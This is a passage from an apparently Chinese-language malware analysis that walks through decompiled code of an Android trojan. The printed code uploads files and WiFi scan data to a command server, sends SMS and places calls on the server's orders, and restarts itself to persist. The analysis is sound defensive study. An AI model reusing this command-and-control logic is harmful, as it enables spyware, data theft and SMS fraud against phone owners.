    StringBuilder wifi_Result = new StringBuilder();
    switch(this.getSystemService(&quot;wifi&quot;).getWifiState()) {
        case 0: {
            wifi_state = &quot;WIFI正在关闭&quot;;
            break;
        }
        case 1: {
            wifi_state = &quot;WIFI网卡已关闭&quot;;
            break;
        }
        case 2: {
            wifi_state = &quot;WIFI正在打开&quot;;
            break;
        }
        case 3: {
            wifi_state = &quot;WIFI网卡已开启&quot;;
            break;
        }
        default: {
            wifi_state = &quot;未知网卡状态&quot;;
            break;
        }
    }
    wifi_Result.append(wifi_state);
    return wifi_Result.toString();
}
</code></pre><p>这个很明显了，如果WiFi可用就打开WiFi</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;openWiFi&quot;)) {
    object = this.getSystemService(&quot;wifi&quot;);
    if(((WifiManager)object).isWifiEnabled()) {
        goto label_5;
    }
    object.setWifiEnabled(true);
    goto label_5;
}
</code></pre><p>这个意思也很明显了，关闭WiFi</p>
<pre><code>if(new String(arraychar, 0, length).equals(&quot;closeWiFi&quot;)) {
    object = this.getSystemService(&quot;wifi&quot;);
    if(!((WifiManager)object).isWifiEnabled()) {
        goto label_5;
    }
    object.setWifiEnabled(false);
    goto label_5;
}
</code></pre><p>然后又出现了选择</p>
<pre><code>if(!new String(arraychar, 0, length).equals(&quot;scanWiFi&quot;)) {
    goto label_676;
}
</code></pre><p>我就是不跳到label_676，直接看后面的代码</p>
<p>看得出来是扫描wifi（刚才那个if里的数据也说了）</p>
<pre><code>object = this.getSystemService(&quot;wifi&quot;);
((WifiManager)object).startScan();
List list_wifi = ((WifiManager)object).getScanResults();
StringBuilder allwifiinformation = new StringBuilder();
if(list_wifi != null) {
    int i = 0;
    goto label_596;
</code></pre><p>不为空则跳到label_596</p>
<pre><code>label_596:
    while(i &amp;lt; list_wifi.size()) {
        Object object_temp = list_wifi.get(i);
        allwifiinformation = allwifiinformation
                                .append(String.valueOf(object_temp.BSSID) + &quot;|&quot;)
                                .append(String.valueOf(object_temp.SSID) +&quot;|&quot;)
                                .append(String.valueOf(object_temp.capabilities) + &quot;|&quot;)
                                .append(String.valueOf(object_temp.frequency) + &quot;|&quot;)
                                .append(String.valueOf(object_temp.level) + &quot;~&quot;);
        ++i;
</code></pre><p>看得出来是在搜集wifi信息吧</p>
<p>搜集完了就退出来，给服务器发数据然后继续label_5</p>
<pre><code>outputstream.write(&quot;result_WiFiList&quot; + allwifiinformation.toString().getBytes(&quot;GBK&quot;));
outputstream.write(&quot;\n&quot;.getBytes());
goto label_5;
</code></pre><p>另一种情况，跳到label_676</p>
<p>如果服务器返回的是<code>LoadFile</code>，判断是否是文件</p>
<pre><code>if(new String(arraychar, 0, 8).equals(&quot;LoadFile&quot;)) {
    File file = new File(String.valueOf(Environment.getExternalStorageDirectory().getPath()) + new String(arraychar, 8, length - 8));
    if(!file.isFile()) {
        goto label_5;
    }
    randomaccessfile = new RandomAccessFile(file, &quot;r&quot;);
    v20 = new byte[1024];
    goto label_723;
}
</code></pre><p>是的话跳到label_723</p>
<p>打开该文件将该文件内容发送给服务器</p>
<pre><code>while(true) {
    label_723:
        int length = randomaccessfile.read(v20);
        if(length == -1) {
            goto label_5;
        }
        outputstream.write(v20, 0, length);
}
</code></pre><p>接着继续判断服务器返回的数据</p>
<pre><code>else {
    //如果服务器返回的是&quot;ScreenShot&quot;，返回label_5（咦？什么都没做诶）
    if(new String(arraychar, 0, 8).equals(&quot;ScreenShot&quot;)) {
        goto label_5;
    }
</code></pre><p>如果服务器返回的前7字节是<code>SendSms</code>，执行<code>this.SendSmsMes(v15[0], v15[1])</code></p>
<pre><code>if(new String(arraychar, 0, 7).equals(&quot;SendSms&quot;)) {
    String[] v15 = new String(arraychar, 7, length - 7).split(&quot;\\|&quot;);
    outputstream.write(&quot;result_SmsStatus&quot; + this.SendSmsMes(v15[0], v15[1]).getBytes(&quot;GBK&quot;));
    outputstream.write(&quot;\n&quot;.getBytes());
    goto label_5;
}
</code></pre><p>跳过去，还记不记得最开始咱们注册了一个<code>broadcastreceiver</code>，action是<code>sms.send</code></p>
<p>但是<code>onReceiver()</code>方法里面只有几句看不懂的代码，得结合这里分析，这里是用PendingIntent，用于延迟，也就是说收到作者的短信触发，给指定号码发送指定的短信内容</p>
<pre><code>private String SendSmsMes(String phoneNumber, String content) {
    String NULL = null;
    StringBuilder sendmessage_Result = new StringBuilder();
    SmsManager smsmanager = SmsManager.getDefault();
    PendingIntent pendingintent = PendingIntent.getBroadcast(((Context)this), 0, new Intent(&quot;sms.send&quot;), 0);
    Iterator iterator = smsmanager.divideMessage(content).iterator();
    while(iterator.hasNext()) {
        smsmanager.sendTextMessage(phoneNumber, NULL, iterator.next(), pendingintent, ((PendingIntent)NULL));
    }
    long v1 = 3000;
    try {
        Thread.sleep(v1);
    }
    catch(InterruptedException v7) {
        v7.printStackTrace();
    }
    sendmessage_Result.append(this.Sendresult);
    return sendmessage_Result.toString();
}
</code></pre><p>然后会有状态码返回服务器</p>
<p><img src="Image/10.png" alt=""></p>
<p>如果服务器返回的前9字节不是<code>CallPhone</code>，又什么都不做</p>
<p>如果是则拨号，号码为<code>CallPhone</code>后面跟着的数字</p>
<pre><code>else {
    if(!new String(arraychar, 0, 9).equals(&quot;CallPhone&quot;)) {
        goto label_5;
    }
    Intent intent = new Intent(&quot;android.intent.action.CALL&quot;, Uri.parse(&quot;tel:&quot; + new String(arraychar, 9, length - 9)));
    intent.setFlags(268435456);
    this.startActivity(intent);
    goto label_5;
</code></pre><p>以上就是把所有可能循环了一遍，代码很乱，需要多在纸上画画才不至于绕晕</p>
<p>继续<code>onStartCommand()</code></p>
<p>这句是循环自身</p>
<pre><code>this.val$handler.postDelayed(((Runnable)this), 2000);
</code></pre><p>最后来分析<code>onDestroy()</code>方法</p>
<pre><code>public void onDestroy() {
    File[] list_file = this.getCacheDir().listFiles();  // 获取当前应用缓存文件
    if(list_file != null) {
        int filenumber = list_file.length;
        int i;
        for(i = 0; i &amp;lt; filenumber; ++i) {
            list_file[i].delete();  // 循环遍历删除缓存文件
        }
    }
    this.releaseWakeLock();//释放锁
    Intent intent = new Intent();
    intent.setClass(((Context)this), PhoneSyncService.class);
    this.startService(intent);  // 重启PhoneSyncService，保证一直存活
    Log.i(&quot;PhoneIMEService&quot;, &quot;service destroy&quot;);
    super.onDestroy();
}
</code></pre><p>释放锁的代码是这样的</p>
<pre><code>private void releaseWakeLock() {
    if(this.mWakeLock != null) {
        this.mWakeLock.release();
        this.mWakeLock = null;
    }
}
</code></pre>
</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
